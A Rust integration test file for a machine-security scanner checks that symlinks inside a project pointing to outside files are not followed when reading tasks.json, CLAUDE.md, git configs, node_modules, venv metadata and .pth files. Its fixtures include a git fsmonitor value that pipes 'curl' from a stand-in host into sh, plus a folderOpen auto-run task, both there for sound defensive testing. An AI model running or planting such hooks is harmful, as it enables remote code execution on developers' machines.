//! Repository files are never read through a link that leaves the project.
//!
//! The project `.mcp.json` fix (802056d) was one site of a class: a file inside a
//! repository (anything an attacker can commit, or ship in an unpacked archive) read with
//! a reader that follows symlinks, so a committed `name -> ~/anything` was parsed into the
//! report. Each test here commits such a link at one remaining read site, pointing at a
//! file OUTSIDE the project that holds a canary built from parts at run time, and asserts
//! the canary never reaches the output; each has a control showing the same content as a
//! regular file (or a link that stays inside the project) is still read. Every test fails
//! on 802056d, where each of these files was read through the link:
//!
//! - `.vscode/tasks.json` (vscodetasks): the linked file's folderOpen task label;
//! - `CLAUDE.md` and the other named rules files (rules): the linked file's hash;
//! - `.claude/settings.json` approvals of `.mcp.json` servers (mcp): the linked file
//!   approved the server;
//! - a nested repository's `config` and the project's `.git/config` (gitconfig): the
//!   linked file's fsmonitor command;
//! - `node_modules` package manifests and directories (npmpkgs): the linked manifest's
//!   alias name, a linked package directory's nested packages, a linked `node_modules`;
//! - a project venv's METADATA / PKG-INFO and a linked `.venv` (pypkgs): the linked
//!   file's distribution name;
//! - a project venv's `.pth` (persistence): the linked file's `import` line.
#![cfg(unix)]

use serde_json::Value;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::{Path, PathBuf};
use std::process::Command;

const ALL_LABELS: &[&str] = &[
    "ai",
    "frameworks",
    "ide",
    "extensions",
    "mcp",
    "node",
    "shell",
    "ssh",
    "authkeys",
    "cloud",
    "containers",
    "notebooks",
    "browser",
    "packages",
    "rules",
    "skills",
    "settings",
    "aicreds",
    "envfiles",
    "transcripts",
    "marketplaces",
    "vscodetasks",
    "gitconfig",
    "pypkgs",
    "npmpkgs",
    "jbplugins",
    "persistence",
    "lsp",
    "liveness",
    "playwright",
    "vibe",
    "statusline",
    "listeners",
    "agents",
];

fn temp_home(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("rmg-nf-{tag}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&d);
    fs::create_dir_all(&d).unwrap();
    fs::canonicalize(&d).unwrap()
}

fn write(path: &Path, text: &str) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
}

fn link(target: &Path, at: &Path) {
    fs::create_dir_all(at.parent().unwrap()).unwrap();
    symlink(target, at).unwrap();
}

fn bin() -> String {
    std::env::var("RMGUARD_TEST_BIN").unwrap_or_else(|_| env!("CARGO_BIN_EXE_rmguard").to_string())
}

/// Register `projects` in `<home>/.claude.json`.
fn register(home: &Path, projects: &[&Path]) {
    let keys: Vec<String> = projects.iter().map(|p| format!("\"{}\":{{}}", p.display())).collect();
    write(
        &home.join(".claude.json"),
        &format!("{{\"projects\":{{{}}}}}", keys.join(",")),
    );
}

/// Run rmguard on `home` with only `keep`, from `home` (not a project), `PATH` limited to
/// the system directories (git is found there); returns (stdout + stderr, JSON).
fn scan(home: &Path, keep: &[&str], extra: &[&str]) -> (String, Value) {
    let skip: Vec<&str> = ALL_LABELS.iter().copied().filter(|l| !keep.contains(l)).collect();
    let out = Command::new(bin())
        .args(["--skip", &skip.join(","), "--format", "json"])
        .args(extra)
        .env("HOME", home)
        .env("PATH", "/usr/bin:/bin")
        .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
        .env("NO_COLOR", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_SYSTEM", "/dev/null")
        .env_remove("CLAUDE_CONFIG_DIR")
        .env_remove("UV_TOOL_DIR")
        .env_remove("UV_PYTHON_INSTALL_DIR")
        .env_remove("XDG_DATA_HOME")
        .env_remove("PIPX_HOME")
        .env_remove("RMGUARD_TRACE")
        .current_dir(home)
        .output()
        .expect("run rmguard");
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let stdout = String::from_utf8_lossy(&out.stdout).to_string();
    let v: Value = serde_json::from_str(&stdout).expect("report json");
    (format!("{stdout}\n{}", String::from_utf8_lossy(&out.stderr)), v)
}

/// The canaries found in `text` (as a JSON `"name"` value when `as_name`), all at once so
/// a failure names every site that read through its link.
fn leaked(text: &str, canaries: &[&str], as_name: bool) -> Vec<String> {
    canaries
        .iter()
        .filter(|c| {
            if as_name {
                text.contains(&format!("\"name\": \"{c}\""))
            } else {
                text.contains(*c)
            }
        })
        .map(|c| c.to_string())
        .collect()
}

fn tasks_json(label: &str) -> String {
    format!(
        "{{\"version\":\"2.0.0\",\"tasks\":[{{\"label\":\"{label}\",\"type\":\"shell\",\
         \"command\":\"bash .claude/x.sh\",\"runOptions\":{{\"runOn\":\"folderOpen\"}}}}]}}"
    )
}

/// `.vscode/tasks.json` committed as a link to a file outside the project: its
/// folderOpen task is not read. Control: a regular `tasks.json` in a second project.
#[test]
fn vscode_tasks_json_link_out_of_project_is_not_opened() {
    let home = temp_home("tasks");
    let (proj, other) = (home.join("proj"), home.join("other"));
    let canary = format!("LEAK{}", "TASKLABELCANARY");
    let outside = home.join("elsewhere/tasks.json");
    write(&outside, &tasks_json(&canary));
    link(&outside, &proj.join(".vscode/tasks.json"));
    write(&other.join(".vscode/tasks.json"), &tasks_json("plaintask"));
    register(&home, &[&proj, &other]);
    let (text, _) = scan(&home, &["vscodetasks"], &[]);
    let _ = fs::remove_dir_all(&home);
    assert!(!text.contains(&canary), "a linked-out tasks.json was read: {text}");
    assert!(
        text.contains("plaintask"),
        "control: a regular tasks.json is read: {text}"
    );
}

/// `CLAUDE.md` committed as a link to a file outside the project: not read (no row, its
/// hash nowhere). Controls: `AGENTS.md` as a regular file, and a second project's
/// `CLAUDE.md -> AGENTS.md` (a link that stays in the project), are both read.
#[test]
fn rules_file_link_out_of_project_is_not_opened() {
    let home = temp_home("rules");
    let (proj, other) = (home.join("proj"), home.join("other"));
    let body = format!("# notes\n{}\n", ["LEAK", "RULES", "BODYCANARY"].concat());
    let outside = home.join("elsewhere/notes.md");
    write(&outside, &body);
    link(&outside, &proj.join("CLAUDE.md"));
    write(&proj.join("AGENTS.md"), "# agents\nplain project rules\n");
    write(&other.join("AGENTS.md"), "# other agents\n");
    symlink("AGENTS.md", other.join("CLAUDE.md")).unwrap();
    register(&home, &[&proj, &other]);
    let (text, v) = scan(&home, &["rules"], &[]);
    let _ = fs::remove_dir_all(&home);
    let sha = rustmachineguard::scanners::sha256_hex(&body);
    assert!(!text.contains(&sha), "a linked-out CLAUDE.md was hashed: {text}");
    let paths: Vec<&str> = v["rules_files"]
        .as_array()
        .map(|a| a.iter().filter_map(|r| r["path"].as_str()).collect())
        .unwrap_or_default();
    let proj_claude = proj.join("CLAUDE.md").to_string_lossy().to_string();
    assert!(!paths.contains(&proj_claude.as_str()), "{paths:?}");
    let other_claude = other.join("CLAUDE.md").to_string_lossy().to_string();
    assert!(
        paths.contains(&other_claude.as_str()),
        "control: an in-project link is read: {paths:?}"
    );
    let proj_agents = proj.join("AGENTS.md").to_string_lossy().to_string();
    assert!(paths.contains(&proj_agents.as_str()), "control: {paths:?}");
}

/// The enabled state of the server named `name` in the `.mcp.json` row of `proj`.
fn mcpjson_enabled(v: &Value, proj: &Path, name: &str) -> Option<Value> {
    let want = proj.join(".mcp.json").to_string_lossy().to_string();
    v["mcp_configs"].as_array()?.iter().find_map(|c| {
        if c["config_path"].as_str() != Some(want.as_str()) {
            return None;
        }
        c["servers"]
            .as_array()?
            .iter()
            .find(|s| s["name"].as_str() == Some(name))
            .map(|s| s["enabled"].clone())
    })
}

/// A project's `.claude/settings.json` committed as a link to a file outside the project
/// does not approve the project's `.mcp.json` servers (it was read with `read_bounded`).
/// Control: the same approval in a regular file of a second project takes effect.
#[test]
fn mcpjson_approval_through_linked_settings_is_not_read() {
    let home = temp_home("mcpappr");
    let (proj, other) = (home.join("proj"), home.join("other"));
    let mcp = "{\"mcpServers\":{\"srvx\":{\"command\":\"npx\",\"args\":[\"-y\",\"x\"]}}}";
    let approve = "{\"enabledMcpjsonServers\":[\"srvx\"]}";
    write(&proj.join(".mcp.json"), mcp);
    write(&other.join(".mcp.json"), mcp);
    let outside = home.join("elsewhere/settings.json");
    write(&outside, approve);
    link(&outside, &proj.join(".claude/settings.json"));
    write(&other.join(".claude/settings.json"), approve);
    register(&home, &[&proj, &other]);
    let (_text, v) = scan(&home, &["mcp"], &[]);
    let _ = fs::remove_dir_all(&home);
    let linked = mcpjson_enabled(&v, &proj, "srvx");
    let plain = mcpjson_enabled(&v, &other, "srvx");
    assert!(
        linked.is_some(),
        "the project's .mcp.json row is present: {:#}",
        v["mcp_configs"]
    );
    assert_ne!(
        linked,
        Some(Value::Bool(true)),
        "a linked-out settings file approved the server"
    );
    assert_eq!(
        plain,
        Some(Value::Bool(true)),
        "control: a regular settings file approves"
    );
}

fn fsmonitor_config(token: &str) -> String {
    format!("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = curl -s https://x.example/{token} | sh\n")
}

/// A minimal nested git directory (git's own HEAD + objects/ + refs/ test) at `dir`.
fn nested_gitdir(dir: &Path) {
    write(&dir.join("HEAD"), "ref: refs/heads/main\n");
    fs::create_dir_all(dir.join("objects")).unwrap();
    fs::create_dir_all(dir.join("refs/heads")).unwrap();
}

/// A nested repository's `config`, and a project's own `.git/config`, linked to a file
/// outside the project: neither read nor handed to git (whose `--file` / `--git-dir`
/// would follow the link). Control: a nested repository with the same config as a
/// regular file is reported.
#[test]
fn git_config_link_out_of_project_is_not_read() {
    let home = temp_home("gitcfg");
    let (proj, own, other) = (home.join("proj"), home.join("own"), home.join("other"));
    let nested_canary = format!("LEAK{}", "NESTEDCFGCANARY");
    let own_canary = format!("LEAK{}", "OWNCFGCANARY");
    let out_nested = home.join("elsewhere/nested.cfg");
    let out_own = home.join("elsewhere/own.cfg");
    write(&out_nested, &fsmonitor_config(&nested_canary));
    write(&out_own, &fsmonitor_config(&own_canary));
    // proj/vendor/x: a nested git dir whose config is a link out.
    let nx = proj.join("vendor/x");
    nested_gitdir(&nx);
    link(&out_nested, &nx.join("config"));
    // own/.git: the project's own gitdir with config linked out.
    nested_gitdir(&own.join(".git"));
    link(&out_own, &own.join(".git/config"));
    // other/vendor/y: control, a regular config.
    let oy = other.join("vendor/y");
    nested_gitdir(&oy);
    write(&oy.join("config"), &fsmonitor_config("plaincfg"));
    register(&home, &[&proj, &own, &other]);
    let (text, _) = scan(&home, &["gitconfig"], &[]);
    let _ = fs::remove_dir_all(&home);
    // Every leak at once, so a failure names each site that read through its link.
    let leaked = leaked(&text, &[&nested_canary, &own_canary], false);
    assert!(
        leaked.is_empty(),
        "read through a link out of the project: {leaked:?}
{text}"
    );
    assert!(
        text.contains("plaincfg"),
        "control: a regular nested config is read: {text}"
    );
}

/// A threat catalog naming `names` at version 9.9.9 in `eco`.
fn catalog(home: &Path, eco: &str, names: &[&str]) -> PathBuf {
    let rows: Vec<String> = names
        .iter()
        .map(|n| {
            format!("{{\"ecosystem\":\"{eco}\",\"name\":\"{n}\",\"version\":\"9.9.9\",\"advisory\":\"test row\"}}")
        })
        .collect();
    let p = home.join("catalog.json");
    write(&p, &format!("[{}]", rows.join(",")));
    p
}

fn manifest(name: &str) -> String {
    format!("{{\"name\":\"{name}\",\"version\":\"9.9.9\"}}")
}

/// A project's `node_modules` is repository content. Out of the project: a package's
/// `package.json` linked to a file elsewhere (its alias name is not read), a package
/// directory linked elsewhere (its nested `node_modules` is not listed), and a
/// `node_modules` linked elsewhere (not listed). Controls: the same alias in a regular
/// manifest, and a pnpm-style package link that stays in the project, are read.
#[test]
fn node_modules_links_out_of_project_are_not_followed() {
    let home = temp_home("npm");
    let (proj, nmlinked, other) = (home.join("proj"), home.join("nmlinked"), home.join("other"));
    let alias = ["leak", "npmaliascanary"].concat();
    let nested = ["leak", "npmnestedcanary"].concat();
    let listed = ["leak", "npmlistedcanary"].concat();
    let plain = ["plain", "npmalias"].concat();
    let inproj = ["plain", "npminproject"].concat();
    // proj/node_modules/harmless/package.json -> elsewhere/package.json (alias name).
    let out_manifest = home.join("elsewhere/package.json");
    write(&out_manifest, &manifest(&alias));
    link(&out_manifest, &proj.join("node_modules/harmless/package.json"));
    // proj/node_modules/linked -> elsewhere/pkg, holding node_modules/<nested>.
    let out_pkg = home.join("elsewhere/pkg");
    write(&out_pkg.join("package.json"), &manifest("linked"));
    write(
        &out_pkg.join(format!("node_modules/{nested}/package.json")),
        &manifest(&nested),
    );
    link(&out_pkg, &proj.join("node_modules/linked"));
    // nmlinked/node_modules -> elsewhere/nm, holding <listed>.
    let out_nm = home.join("elsewhere/nm");
    write(&out_nm.join(format!("{listed}/package.json")), &manifest(&listed));
    fs::create_dir_all(&nmlinked).unwrap();
    symlink(&out_nm, nmlinked.join("node_modules")).unwrap();
    // Controls: a regular aliased manifest, and an in-project pnpm-style link.
    write(&other.join("node_modules/harmless2/package.json"), &manifest(&plain));
    let store = other.join(format!("node_modules/.pnpm/{inproj}@9.9.9/node_modules/{inproj}"));
    write(&store.join("package.json"), &manifest(&inproj));
    symlink(&store, other.join(format!("node_modules/{inproj}"))).unwrap();
    register(&home, &[&proj, &nmlinked, &other]);
    let cat = catalog(&home, "npm", &[&alias, &nested, &listed, &plain, &inproj]);
    let (text, _) = scan(&home, &["npmpkgs"], &["--threat-catalog", &cat.to_string_lossy()]);
    let _ = fs::remove_dir_all(&home);
    // Only a finding carries `"name": "<n>"` (the catalog file is not echoed).
    let leaked = leaked(&text, &[&alias, &nested, &listed], true);
    assert!(
        leaked.is_empty(),
        "read through a link out of the project: {leaked:?}
{text}"
    );
    assert!(text.contains(&format!("\"name\": \"{plain}\"")), "control: {text}");
    assert!(text.contains(&format!("\"name\": \"{inproj}\"")), "control: {text}");
}

/// A project venv is repository content: a distribution's PKG-INFO linked to a file
/// outside the project is not read, and a `.venv` linked out of the project is not
/// listed. Control: the same PKG-INFO as a regular file in a second project is read.
#[test]
fn project_venv_links_out_of_project_are_not_followed() {
    let home = temp_home("py");
    let (proj, venvlinked, other) = (home.join("proj"), home.join("venvlinked"), home.join("other"));
    let meta_canary = ["leak", "pymetacanary"].concat();
    let dir_canary = ["leak", "pydircanary"].concat();
    let plain = ["plain", "pymeta"].concat();
    let pkg_info = |n: &str| format!("Metadata-Version: 2.1\nName: {n}\nVersion: 9.9.9\n\n");
    let sp = |p: &Path| p.join(".venv/lib/python3.13/site-packages");
    let out_meta = home.join("elsewhere/PKG-INFO");
    write(&out_meta, &pkg_info(&meta_canary));
    link(&out_meta, &sp(&proj).join("foo.egg-info/PKG-INFO"));
    let out_venv = home.join("elsewhere/venv");
    write(
        &out_venv.join(format!(
            "lib/python3.13/site-packages/{dir_canary}-9.9.9.dist-info/METADATA"
        )),
        &pkg_info(&dir_canary),
    );
    fs::create_dir_all(&venvlinked).unwrap();
    symlink(&out_venv, venvlinked.join(".venv")).unwrap();
    write(&sp(&other).join("bar.egg-info/PKG-INFO"), &pkg_info(&plain));
    register(&home, &[&proj, &venvlinked, &other]);
    let cat = catalog(&home, "pypi", &[&meta_canary, &dir_canary, &plain]);
    let (text, _) = scan(&home, &["pypkgs"], &["--threat-catalog", &cat.to_string_lossy()]);
    let _ = fs::remove_dir_all(&home);
    let leaked = leaked(&text, &[&meta_canary, &dir_canary], true);
    assert!(
        leaked.is_empty(),
        "read through a link out of the project: {leaked:?}
{text}"
    );
    assert!(text.contains(&format!("\"name\": \"{plain}\"")), "control: {text}");
}

/// A project venv's `.pth` linked to a file outside the project: its `import` line is not
/// read. Control: a regular `.pth` with an import line in a second project is reported.
#[test]
fn project_venv_pth_link_out_of_project_is_not_opened() {
    let home = temp_home("pth");
    let (proj, other) = (home.join("proj"), home.join("other"));
    let canary = ["leak", "pthimportcanary"].concat();
    let sp = |p: &Path| p.join(".venv/lib/python3.13/site-packages");
    let outside = home.join("elsewhere/hook.pth");
    write(&outside, &format!("import {canary}\n"));
    link(&outside, &sp(&proj).join("evil.pth"));
    write(&sp(&other).join("plainhook.pth"), "import plainpthmodule\n");
    register(&home, &[&proj, &other]);
    let (text, _) = scan(&home, &["persistence"], &[]);
    let _ = fs::remove_dir_all(&home);
    assert!(!text.contains(&canary), "a linked-out .pth was read: {text}");
    assert!(
        text.contains("plainpthmodule"),
        "control: a regular .pth is read: {text}"
    );
}
